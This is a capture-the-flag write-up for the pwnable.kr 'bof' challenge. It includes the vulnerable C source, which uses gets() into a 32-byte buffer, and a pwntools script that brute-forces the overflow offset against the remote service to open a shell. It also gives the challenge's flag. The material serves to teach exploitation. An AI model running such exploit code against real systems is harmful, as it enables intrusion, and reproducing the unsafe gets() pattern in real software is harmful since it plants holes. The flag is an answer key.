# bof #

Probably the first thing that could be remotely described as real-world in the toddler's bottle challenges.

## Problem Description ##

```
Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000
```

## Reconnaissance and Analysis ##

Connecting to the target doesn't tell us much. We can observe the "normal" and "overflow" behavior.

```
root@kali:collision# nc pwnable.kr 9000
hello
overflow me : 
Nah..
root@kali:collision# nc pwnable.kr 9000
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 
Nah..
root@kali:collision# 
```

The problem description gives us a copy of `bof.c`.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

The `overflowme` buffer can accept 32 characters. It looks like this is where we'll perform our overflow.

## Solution ##

Send 32 or more characters -- any characters -- followed by `0xcafebabe`. 

This is where we start hitting challenges that are more straightforwardly accomplished via `pwntools`. We don't know how far beyond the buffer our target memory address is going to be, so we're going to have to guess. A lot. See the `pwntools` implementation below for an illustrative example.  

## Concepts and Further Reading ##

## `pwntools` Implementation ##

Here is one implementation that yields an interactive shell.

```python
from pwn import *

# We don't know how far we need to perform the
# overflow. We just know it starts overflowing
# at 32 characters. We can brute force our way
# through this by looping our attack.

for i in range(32,132):
    
    print("Attempt #",i)

    # Craft our buffer overflow payload. #
    payload = 'a'*i+pack(0xcafebabe)

    # Connect to target. #
    r = remote(host='pwnable.kr',
            port=9000)

    # Send the payload to STDIN #
    r.sendline(payload)

    # Pull the output.
    output = r.recv(4096,timeout=1)

    # If the response is empty, then we presume
    # that the `bof` script dropped a shell for
    # us.
    if output=='':
        print(" !!! pwned !!! ")
        print("Brute force was successful on iteration",str(i))
        print("Here is your shell:")
        r.interactive()
        break
    else:
        # Otherwise, close the remote pipe and
        # try again.
        r.close()
```

Once in, you just run `cat flag` and you'll get the flag, `daddy, I just pwned a buFFer :)`. The code in the repo is the Fully Automated(tm) version.